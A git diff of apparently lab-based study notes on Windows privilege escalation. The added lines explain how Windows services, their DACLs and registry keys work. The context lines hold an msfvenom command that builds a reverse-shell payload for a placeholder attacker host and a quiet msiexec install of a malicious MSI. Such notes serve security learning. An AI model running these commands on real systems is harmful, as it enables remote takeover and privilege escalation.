@@ -177,7 +177,46 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.189.232 LPORT=LO
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
 # Abusing Service Misconfigurations
+## Windows Services
+* Managed by Service Control Manager (SCM).
+* Each service has associated executable run by SCM whenever service is started.
+* Not any executable can be started as a service successfully.
+  * Service executables implement special functions to communicate with SCM.
+* Services specify the user account under which they will run.
+* `sc qc` shows structure of `apphostsvc` service.
+```
+sc qc apphostsvc
+[SC] QueryServiceConfig SUCCESS
 
+SERVICE_NAME: apphostsvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
+``` 
+* **BINARY_PATH_NAME** specifies associated executable.
+* **SERVICE_START_NAME** species the account used to run the service.
+* Services have a Discretionary Access Control List (DACL).
+  * Defines who has permission to start, stop, pause, query status, query configuration, or reconfigure the service.
+* DACL can be seen from Process Hacker.
+* All services configurations are stored in the registry.
+```
+HKLM\SYSTEM\CurrentControlSet\Services\
+```
+* Subkey exists for each service.
+  * **ImagePath** shows associated executable.
+  * **ObjectName** shows account used to start the service.
+  * **Security** stores DACL if configured for the service.
+* Only administrators can modify these registry entries by default.
+## Insecure Permissions on Service Executable
+* 
+## Unquoted Service Paths
+## Insecure Service Permissions
 
 # Abusing Dangerous Privileges
 
